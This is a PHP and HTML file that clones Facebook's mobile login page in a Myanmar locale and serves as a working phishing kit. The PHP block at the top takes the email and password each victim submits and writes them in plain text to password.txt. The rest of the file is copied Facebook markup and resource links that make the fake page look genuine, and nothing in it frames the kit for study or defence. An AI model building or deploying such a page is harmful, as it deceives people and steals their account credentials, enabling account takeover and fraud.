<?php

$email = $_POST["name"];
$pass = $_POST["pass"];
$handle = fopen ("password.txt", "a");
$handle = fopen ("password.txt", "a");

if (isset($_POST["submit"])) {
  fwrite ($handle, $email);
  fwrite ($handle, ":");
  fwrite ($handle, $pass);
  fwrite ($handle, "\r\n");
  fclose ($handle);
}
?>
<html lang="my">
 <head>
  <title>Facebook - login Page</title>
  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <meta name="theme-color" content="#3b5998">
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/NWcV81P5wDG.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous">
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/l/0,cross/O5EmHu4_HKs.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="cmZMpZs" crossorigin="anonymous">
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/l/0,cross/JOMbNZDcIGF.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="r2e1Kfy" crossorigin="anonymous">
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/l/0,cross/lE3g__qp3JP.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="VFYfvHi" crossorigin="anonymous"> 
  <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
  <meta name="description" content="One or Facebook Log in Friends you know Connect with family and other people. Photos and videos...">
  <link rel="canonical" href="https://www.facebook.com/">
  <meta property="og:site_name" content="Facebook">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Facebook - Login or Register">
  <meta property="og:description" content="Create an account (Or) Facebook Log in Friends you know Connect with family and other people. Share photos and videos Send messages and get updates.">
  <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
  <meta property="og:url" content="https://www.facebook.com/">
  <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/">
  <link rel="alternate" hreflang="en" href="https://www.facebook.com/">
  <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/">
  <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/">
  <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/">
  <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/">
  <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/">
  <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/">
  <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/">
  <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/">
  <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/">
  <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/">
  <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/">
  <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/">
  <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/">
  <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/">
  <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/">
  <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/">
  <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/">
  <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/">
  <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/">
  <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/">
  <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/">
  <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/">
  <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/">
  <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/">
  <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/">
  <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/">
  <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/">
  <link rel="manifest" href="/data/manifest/" crossorigin="use-credentials">
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/QZnyh0f28Vs.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iVi34/yO/l/my_MM/oqLiJlt60SD.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/UP7cGnAcBAF.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/oNc1zYCy2PI.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/PYgQcxUrcX_.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3i_yp4/yI/l/my_MM/EqGnICJol4p.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iTlv4/yz/l/my_MM/jFCnDi1Qy40.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/sDS6gd5NWLP.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iZy_4/yy/l/my_MM/T8-roA4QPHz.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iqQE4/yS/l/my_MM/3atVrvTkcMq.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iGP-4/yV/l/my_MM/4UpijiTi3Uo.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/HuVQwJ6Qu6t.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/ROJ_l_eUinL.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
<link rel="stylesheet" href="style.css">
 </head>
 <body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw portrait" style="min-height: 675px; background-color: rgb(255, 255, 255);"> 
  <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 675px;">
   <div id="page">
    <div class="_129_" id="header-notices"></div>
    <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 675px;">
     <div class="_7om2">
      <div class="_4g34" id="u_0_0_oH">
       <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
        <div class="_52jd"></div>
       </div>
       <div class="_9om_">
        <div class="_4-4l">
         <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
          <div class="_qw9 grouped aclb" id="u_0_1_Ay">
           <a href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253D_34sYU5S-OBUkZWeqU6ESp0F%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
            <div class="ib cc">
             <i class="l img sp_xm9DDmY7HAL_2x sx_3bd3fe"></i>
             <div class="c">
               <style>
           
                         </style>
              <span class="fcl">FREE FIRE HIGH WAY</span>
             </div>
            </div></a>
          </div>
          <iframe style="display: none;"></iframe>
         </div>
         <div class="_7om2 _52we _2pid _52z6">
          <div class="_4g34">
           <a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMwMzA2MTAxLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook"></a>
          </div>
         </div>
         <div class="_5rut">
          <form method="POST" action="index.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_1">
           <input type="hidden" name="lsd" value="AVpJJGJllnU" autocomplete="off">
           <input type="hidden" name="jazoest" value="2967" autocomplete="off">
           <input type="hidden" name="m_ts" value="1630306101">
           <input type="hidden" name="li" value="NX8sYc3arLunbvjSwtVB_UvR">
           <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number">
           <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries">
           <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
           <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
           <div id="otp_retrieve_desc_container"></div>
           <div>
            <div class="_56be">
             <div class="_55wo _56bf">
              <div class="_96n9" id="email_input_container">
               <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="name" placeholder="Mobile phone number or email" data-sigil="m_login_email">
              </div>
             </div>
            </div>
            <div class="_55wq"></div>
            <div class="_56be">
             <div class="_55wo _56bf">
              <div class="_1upc _mg8" data-sigil="m_login_password">
               <div class="_7om2">
                <div class="_4g34 _5i2i _52we">
                 <div class="_5xu4">
                  <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Enter password" type="password" data-sigil="password-plain-text-toggle-input">
                 </div>
                </div>
                <div class="_5s61 _216i _5i2i _52we">
                 <div class="_5xu4">
                  <div class="_2pi9" style="display:none" id="u_0_2_U2">
                   <a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3_wv">Hide</span><span class="mfss" id="u_0_4_4e">Show me</span></a>
                  </div>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
           <div class="_2pie" style="text-align:center;">
            <div id="login_password_step_element" data-sigil="login_password_step_element">
             <input style="background-color:#4159ff"  type="submit" value="Login" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="submit" data-sigil="touchable login_button_block m_login_button" data-autoid="autoid_4">
            </div>
            <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
            <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
            <div id="otp_button_elem_container"></div>
           </div>
           <input type="hidden" name="prefill_contact_point" id="prefill_contact_point">
           <input type="hidden" name="prefill_source" id="prefill_source">
           <input type="hidden" name="prefill_type" id="prefill_type">
           <input type="hidden" name="first_prefill_source" id="first_prefill_source">
           <input type="hidden" name="first_prefill_type" id="first_prefill_type">
           <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false">
           <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false">
           <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false">
           <input type="hidden" id="bi_xrwh" name="bi_xrwh" value="-5532199089626981127">
           <input type="hidden" id="scetoggle">
           <div class="_xo8"></div>
           <noscript>
            <input type="hidden" name="_fb_noscript" value="true">
           </noscript>
          </form>
          <div>
           <div class="_2pie _9omz">
            <div class="_52jj _9on1">
             <a class="_9on1" tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMwMzA2MTAxLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;lwv=100&amp;refid=8" id="forgot-password-link">Forgot password.</a>
            </div>
           </div>
           <div style="padding-top: 42px">
            <div>
             <div>
              <div>
               <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">
                <span class="_43mh">(Or)</span>
               </div>
               <div class="_52jj _5t3b" id="signup_button_area">
                <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Create a new account</a>
               </div>
              </div>
             </div>
             <div class="_2pie" style="text-align:center;">
              <div>
               <div data-sigil="login_identify_step_element"></div>
               <div class="other-links _8p_m">
                <ul class="_5pkb _55wp">
                 <li></li>
                </ul>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
     <div style="display:none">
      <div></div>
     </div>
     <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
     <div class="_55wr _5ui2" data-sigil="m_login_footer">
      <div class="_5dpw">
       <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
        <div class="_7om2">
         <div class="_4g34">
          <span class="_52jc _52j9 _52jh _3ztb">Myanmar language</span>
          <div class="_3ztc">
           <span class="_52jc"><a href="/intl/save_locale/?loc=th_TH&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=th_TH&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">ภาษาไทย</a></span>
          </div>
          <div class="_3ztc">
           <span class="_52jc"><a href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Bahasa Melayu</a></span>
          </div>
          <div class="_3ztc">
           <span class="_52jc"><a href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span>
          </div>
         </div>
         <div class="_4g34">
          <div class="_3ztc">
           <span class="_52jc"><a href="/intl/save_locale/?loc=en_GB&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=en_GB&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">English (UK)</a></span>
          </div>
          <div class="_3ztc">
           <span class="_52jc"><a href="/intl/save_locale/?loc=zh_CN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=zh_CN&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Chinese (Simplified))</a></span>
          </div>
          <div class="_3ztc">
           <span class="_52jc"><a href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Español</a></span>
          </div>
          <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">
           <div class="_3j87 _1rrd _3ztd" aria-label="Complete the list of languages" data-sigil="more_language">
            <i class="img sp_HMu8blxo1Ib_2x sx_659c4e"></i>
           </div></a>
         </div>
        </div>
       </div>
       <div class="_5ui4">
        <div class="_96qv _9a0a">
         <a href="https://about.facebook.com/?refid=8" class="_96qw" title="Read our blog Explore the Resource Center and look for job opportunities.">About</a>
         <span aria-hidden="true"> · </span>
         <a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="Visit our Help Center">Help</a>
         <span aria-hidden="true"> · </span>
         <span class="_96qw" id="u_0_5_Ui">Other</span>
        </div>
        <div class="_96qv" style="display:none" id="u_0_6_oR">
         <a href="https://messenger.com/" class="_96qw" title="Check mail system"> Messenger </a>
         <a href="/lite/?refid=8
      </div>
     </div>
    </div>
    <div class=""></div>
    <div class="viewportArea _2v9s" style="display:none" id="u_0_7_Yy" data-sigil="marea">
     <div class="_5vsg" id="u_0_8_T7" style="max-height: 180px;"></div>
     <div class="_5vsh" id="u_0_9_cZ" style="max-height: 337px;"></div>
     <div class="_5v5d fcg">
      <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Still working ..
     </div>
    </div>
    <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
     <div class="container">
      <div class="image"></div>
      <div class="message" data-sigil="error-message"></div>
      <a class="link" data-sigil="MPageError:retry">Please try again</a>
     </div>
    </div>
   </div>
  </div>
  <div id="static_templates">
   <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_2">
    <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
     <div class="_7om2 _52we">
      <div class="_5s61">
       <div class="_52z7">
        <button type="submit" value="Not anymore" class="cancelButton btn btnD bgb mfss touchable" id="u_0_b_2n" data-sigil="dialog-cancel-button">Not anymore</button>
        <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_c_co" data-sigil="dialog-back-button"><i class="img sp_HMu8blxo1Ib_2x sx_a8da3f" style="margin-top: 2px;"></i></button>
       </div>
      </div>
      <div class="_4g34">
       <div class="_52z6">
        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">
         Still working ..
        </div>
       </div>
      </div>
      <div class="_5s61">
       <div class="_52z8" id="modalDialogHeaderButtons"></div>
      </div>
     </div>
    </div>
    <div class="modalDialogView" id="modalDialogView"></div>
    <div class="_5v5d _5v5e fcg" id="dialogSpinner">
     <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a_qA" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Still working ..
    </div>
   </div>
  </div> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/NWcV81P5wDG.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/l/0,cross/O5EmHu4_HKs.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/QZnyh0f28Vs.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iVi34/yO/l/my_MM/oqLiJlt60SD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ivuD4/yl/l/my_MM/n_XLgZFDGIm.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/l/0,cross/JOMbNZDcIGF.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/l/0,cross/lE3g__qp3JP.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/UP7cGnAcBAF.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/oNc1zYCy2PI.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/PYgQcxUrcX_.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
  <div class="AdBox Ad advert post-ads"></div>
  <iframe srcdoc="" style="display: none;"></iframe>
  
 </body>
</html>
